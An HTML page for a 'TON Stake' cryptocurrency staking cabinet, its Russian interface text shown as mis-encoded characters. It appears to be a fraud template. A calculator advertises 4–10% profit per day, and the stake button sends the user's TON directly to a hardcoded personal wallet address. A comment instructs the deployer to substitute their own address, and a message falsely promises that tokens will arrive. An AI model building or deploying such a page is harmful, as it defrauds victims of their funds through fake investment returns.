<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Stake ‚Äî –ö–∞–±–∏–Ω–µ—Ç</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .card { background: white; border-radius: 24px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        .btn { padding: 12px 24px; border-radius: 40px; font-weight: 600; cursor: pointer; }
        .btn-blue { background: #0098EA; color: white; }
        .btn-blue:hover { background: #0077be; }
        .btn-gray { background: #e2e8f0; color: #475569; cursor: not-allowed; }
        input[type=range] { width: 100%; margin: 10px 0; }
    </style>
</head>
<body class="bg-slate-50">

<div class="max-w-6xl mx-auto p-6">
    <!-- –®–ê–ü–ö–ê -->
    <div class="flex justify-between items-center mb-8">
        <h1 class="text-2xl font-bold">TON Stake <span class="text-sm text-gray-500">–ö–∞–±–∏–Ω–µ—Ç</span></h1>
        <button id="connectBtn" class="btn btn-blue">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
    </div>

    <!-- –ö–ê–õ–¨–ö–£–õ–Ø–¢–û–† -->
    <div class="card mb-6">
        <h2 class="text-xl font-bold mb-4">–î–æ–±–∞–≤–∏—Ç—å –≤ —Å—Ç–µ–π–∫–∏–Ω–≥</h2>
        
        <!-- –°—É–º–º–∞ -->
        <div class="mb-4">
            <label class="block text-sm font-medium mb-2">–°—É–º–º–∞ (TON): <span id="amountValue">10</span> TON</label>
            <input type="range" id="amountRange" min="10" max="10000" step="10" value="10" class="w-full">
        </div>

        <!-- –î–Ω–∏ -->
        <div class="mb-4">
            <label class="block text-sm font-medium mb-2">–î–Ω–∏: <span id="daysValue">1</span></label>
            <input type="range" id="daysRange" min="1" max="365" step="1" value="1" class="w-full">
        </div>

        <!-- –†–µ–∑—É–ª—å—Ç–∞—Ç—ã -->
        <div class="grid grid-cols-3 gap-3 mt-4 p-4 bg-blue-50 rounded-xl">
            <div>
                <div class="text-xs text-gray-500">–í —Å—É—Ç–∫–∏</div>
                <div id="rateDisplay" class="font-bold">4%</div>
            </div>
            <div>
                <div class="text-xs text-gray-500">–ó–∞ 24 —á–∞—Å–∞</div>
                <div id="dailyProfit" class="font-bold">+0.40 TON</div>
            </div>
            <div>
                <div class="text-xs text-gray-500">–ó–∞ 30 –¥–Ω–µ–π</div>
                <div id="monthlyProfit" class="font-bold">+12.00 TON</div>
            </div>
        </div>

        <!-- –ö–Ω–æ–ø–∫–∞ —Å—Ç–µ–π–∫–∏–Ω–≥–∞ -->
        <button id="stakeBtn" class="btn btn-blue w-full mt-4 py-4 text-lg">–í —Å—Ç–µ–π–∫–∏–Ω–≥ ‚Üí</button>
        <div id="txStatus" class="mt-3 text-sm text-center"></div>
    </div>

    <!-- –ê–∫—Ç–∏–≤–Ω—ã–µ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—ã -->
    <div class="card">
        <h3 class="font-bold mb-2">–ê–∫—Ç–∏–≤–Ω—ã–µ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—ã</h3>
        <p class="text-gray-500 text-sm">–£ –≤–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤</p>
    </div>
</div>

<script type="module">
    // ‚ö†Ô∏è –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô –ê–î–†–ï–° TON-–ö–û–®–ï–õ–¨–ö–ê ‚ö†Ô∏è
    const RECEIVER_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW";
    
    // –ò–º–ø–æ—Ä—Ç TonConnect
    import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';

    // –≠–ª–µ–º–µ–Ω—Ç—ã
    const connectBtn = document.getElementById('connectBtn');
    const amountRange = document.getElementById('amountRange');
    const daysRange = document.getElementById('daysRange');
    const amountValue = document.getElementById('amountValue');
    const daysValue = document.getElementById('daysValue');
    const rateDisplay = document.getElementById('rateDisplay');
    const dailyProfit = document.getElementById('dailyProfit');
    const monthlyProfit = document.getElementById('monthlyProfit');
    const stakeBtn = document.getElementById('stakeBtn');
    const txStatus = document.getElementById('txStatus');

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect
    const tonConnectUI = new TonConnectUI({
        manifestUrl: 'https://kap352837598.github.io/tonconnect-manifest.json'
    });

    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –∫–Ω–æ–ø–∫–∏ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
    tonConnectUI.onStatusChange(wallet => {
        connectBtn.textContent = wallet ? '‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω' : 'üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫';
    });

    // –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä —Ç–∞—Ä–∏—Ñ–æ–≤
    function getRate(amount) {
        if (amount < 900) return 0.04;
        if (amount < 2200) return 0.07;
        return 0.10;
    }

    function updateCalculator() {
        const amount = Number(amountRange.value);
        const days = Number(daysRange.value);
        const rate = getRate(amount);
        
        amountValue.textContent = amount;
        daysValue.textContent = days;
        rateDisplay.textContent = (rate * 100) + '%';
        
        const daily = amount * rate;
        const monthly = daily * 30;
        
        dailyProfit.textContent = '+' + daily.toFixed(2) + ' TON';
        monthlyProfit.textContent = '+' + monthly.toFixed(2) + ' TON';
    }

    amountRange.addEventListener('input', updateCalculator);
    daysRange.addEventListener('input', updateCalculator);
    updateCalculator();

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    stakeBtn.addEventListener('click', async () => {
        if (!tonConnectUI.connected) {
            alert('–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏ –∫–æ—à–µ–ª—ë–∫');
            return;
        }

        const amount = Number(amountRange.value);
        txStatus.textContent = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...';
        
        try {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: RECEIVER_ADDRESS,
                    amount: (amount * 1e9).toString(),
                    payload: 'stake'
                }]
            };

            await tonConnectUI.sendTransaction(transaction);
            txStatus.textContent = '‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –¢–æ–∫–µ–Ω—ã —Å–∫–æ—Ä–æ –ø–æ—Å—Ç—É–ø—è—Ç.';
        } catch (error) {
            txStatus.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + (error.message || '–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞');
        }
    });
</script>

</body>
</html>
